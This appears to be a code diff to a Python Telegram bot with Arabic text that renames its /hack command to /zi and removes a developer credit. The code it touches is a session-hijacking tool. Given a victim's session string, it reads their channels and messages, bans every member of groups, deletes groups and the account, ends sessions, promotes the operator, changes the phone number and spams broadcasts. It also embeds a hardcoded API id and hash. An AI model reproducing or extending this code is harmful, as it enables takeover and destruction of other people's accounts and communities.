@@ -417,8 +417,8 @@ menu = '''
 "N" ~ [اوامر الاذاعه]
 
 ملاحظة : الاوامر للحساب والقنوات والكروبات ✅
-اެلمطور ⚠️ @B_8_1
-قناة اࢦمطور 🚹 @S8Y8S 
+
+قناة البوت 🚹 @S8Y8S 
 '''
 mm = '''
 **⚜ملاحضه الانضمام الأولا الى الدعم @SESSIONSUPPORT⚜**
@@ -456,20 +456,20 @@ async def op(event):
   if not event.is_private:
     IndianHack = [
       [
-        Button.url("انقر هنا", f"https://t.me/{Bot_Username}?start=hack")
+        Button.url("انقر هنا", f"https://t.me/{Bot_Username}?start=zi")
         ]
       ]         
     await event.reply("انقر أدناه لاستخدامني", buttons=IndianHack)
-  else:
-    legendbye = [
-      [
-        Button.url("يجب أن تنضم", f"https://t.me/S8Y8S")
-        ]
-      ]
-    await event.reply("انضم أولاً إلى القناة! \n ثم حاول انقر هنا ~ /hack", buttons=legendbye)
+ # else:
+  #  legendbye = [
+  #    [
+   #     Button.url("يجب أن تنضم", f"https://t.me/S8Y8S")
+    #    ]
+    #  ]
+   # await event.reply("انضم أولاً إلى القناة! \n ثم حاول انقر هنا ~ /hack", buttons=legendbye)
     
        
-@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+@client.on(events.NewMessage(pattern="/zi", func=lambda x: x.is_group))
 async def op(event):
   IndianHack = [
     [
@@ -478,7 +478,7 @@ async def op(event):
     ]         
   await event.reply("انقر أدناه لاستخدامي", buttons=IndianHack)
   
-@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
+@client.on(events.NewMessage(pattern="/zi", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
@@ -518,11 +518,11 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا.\n /hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا.\n /zi", buttons=keyboard)
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("تم إنهاء جلسة كود ترمكس مسبقا.\n/hack", buttons=keyboard)
+        return await event.reply("تم إنهاء جلسة كود ترمكس مسبقا.\n/zi", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
         file.write(i + "\n\nDetails BY @S8Y8S")
@@ -530,7 +530,7 @@ async def users(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكرا لاستخدام البوت \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكرا لاستخدام البوت \n/zi", buttons=keyboard)
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -541,7 +541,7 @@ async def users(event):
     if op:
       pass
     else:
-      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا.\n/hack", buttons=keyboard)
+      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا.\n/zi", buttons=keyboard)
     i = await userinfo(strses.text)
     await event.reply(i + "\n\nشكرا لاستخدام البوت \n/hack", buttons=keyboard)
     
@@ -554,11 +554,11 @@ async def users(event):
     if op:
       pass
     else:
-      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
     await x.send_message("اعطني يوزر / ايدي .... المجموعة / القناة")
     grpid = await x.get_response()
     await userbans(strses.text, grpid.text)
-    await event.reply("تم حضر جميع الاعضاء. شكرا لاستخدام البوت \n/hack", buttons=keyboard)
+    await event.reply("تم حضر جميع الاعضاء. شكرا لاستخدام البوت \n/zi", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
 async def users(event):
@@ -569,9 +569,9 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لاستخدام البوت \n/hack", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لاستخدام البوت \n/zi", buttons=keyboard)
     
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -583,11 +583,11 @@ async def users(event):
     if op:
       pass
     else:
-      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
     await x.send_message("اعطني  يوزر / ايدي .... المجموعة / القناة")
     grpid = await x.get_response()
     await joingroup(strses.text, grpid.text)
-    await event.reply("انضم إلى القناة / المجموعة شكرا لاستخدام البوت \n/hack", buttons=keyboard)
+    await event.reply("انضم إلى القناة / المجموعة شكرا لاستخدام البوت \n/zi", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
 async def users(event):
@@ -598,11 +598,11 @@ async def users(event):
     if op:
       pass
     else:
-      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+      return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
     await x.send_message("اعطني يوزر  / ايدي .... المجموعة / القناة")
     grpid = await x.get_response()
     await leavegroup(strses.text, grpid.text)
-    await event.reply("غادرت القناة / المجموعة شكرا لاستخدام البوت \n/hack,", buttons=keyboard)
+    await event.reply("غادرت القناة / المجموعة شكرا لاستخدام البوت \n/zi,", buttons=keyboard)
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
@@ -612,11 +612,11 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
       await x.send_message("اعطني يوزر / ايدي .... المجموعة / القناة")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("تم حذف القناة / المجموعة شكرا لاستخدام البوت \n/hack.", buttons=keyboard)
+      await event.reply("تم حذف القناة / المجموعة شكرا لاستخدام البوت \n/zi.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -643,9 +643,9 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("يتم إنهاء جميع الجلسات\n\nشكرا لاستخدام البوت \n/hack.", buttons=keyboard)
+      await event.reply("يتم إنهاء جميع الجلسات\n\nشكرا لاستخدام البوت \n/zi.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -656,9 +656,9 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n /hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n /zi", buttons=keyboard)
       i = await delacc(strses.text)
-      await event.reply("تم حذف الحساب بنجاح\n\nشكرا لاستخدام البوت \n /hack.", buttons=keyboard)
+      await event.reply("تم حذف الحساب بنجاح\n\nشكرا لاستخدام البوت \n /zi.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
 async def users(event):
@@ -669,13 +669,13 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
       await x.send_message("الان ارسل لي يوزر  المجموعة / القناة")
       grp = await x.get_response()
       await x.send_message("الان ارسل اليوزر  خاص بك")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("أنا أقوم برفعك في المجموعة / القناة ، انتظر دقيقة 😗😗\n\nشكرا لاستخدام البوت \n/hack .", buttons=keyboard)
+      await event.reply("أنا أقوم برفعك في المجموعة / القناة ، انتظر دقيقة 😗😗\n\nشكرا لاستخدام البوت \n/zi .", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
 async def users(event):
@@ -686,14 +686,14 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
       await x.send_message("أعطِ الآن يوزر المجموعة / القناة")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("اقوم بتنزيل جميع أعضاء المجموعة / القناة ، انتظر دقيقة 😗😗\n\nشكرا لاستخدام البوت \n/hack .", buttons=keyboard)
+      await event.reply("اقوم بتنزيل جميع أعضاء المجموعة / القناة ، انتظر دقيقة 😗😗\n\nشكرا لاستخدام البوت \n/zi .", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
 async def users(event):
@@ -704,7 +704,7 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
       await x.send_message("أعط الرقم الذي تريد تغييره \ n [ملاحظة: لا تستخدم الارقام الوهميه أو اكتب الآن أرقامًا] \ n [إذا كنت تستخدم تطبيق ارقام وهميه أو النص الآن ، فلا يمكنك الحصول على كود تسجيل الدخول] ")
       number = (await x.get_response()).text
       try:
@@ -788,12 +788,12 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
       await x.send_message("NOW GIVE MSG")
       msg = await x.get_response()
       await x.send_message("تم الآن وسيتم إرسال الرسالة تلقائيًا كل 10 دقائق")
       i = await gcasta(strses.text, msg.text)
-      await event.reply(f"الان يتم الاذاعه في {i} قنوات و كروبات و خاص 😗😗\n\nشكرا لاستخدام البوت \n/hack .", buttons=keyboard)
+      await event.reply(f"الان يتم الاذاعه في {i} قنوات و كروبات و خاص 😗😗\n\nشكرا لاستخدام البوت \n/zi .", buttons=keyboard)
 
 molb = True
 
@@ -912,12 +912,12 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n/zi", buttons=keyboard)
       await x.send_message("الان اعطني الرساله")
       msg = await x.get_response()
       await x.send_message("تم الآن وسيتم إرسال الرسالة تلقائيًا كل 10 دقائق")
       i = await gcastb(strses.text, msg.text)
-      await event.reply(f"الان يتم الاذاعه في {i} كروبات 😗😗\n\nشكرا لاستخدام البوت \n/hack .", buttons=keyboard)
+      await event.reply(f"الان يتم الاذاعه في {i} كروبات 😗😗\n\nشكرا لاستخدام البوت \n/zi .", buttons=keyboard)
 
 async def gcastc(strses, msg):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -947,7 +947,7 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n /hack", buttons=keyboard)
+        return await event.respond("تم إنهاء جلسة كود ترمكس مسبقا. \n /zi", buttons=keyboard)
       await x.send_message("الان اعطني الرساله")
       msg = await x.get_response()
       await x.send_message("تم الآن وسيتم إرسال الرسالة تلقائيًا كل 10 دقائق")
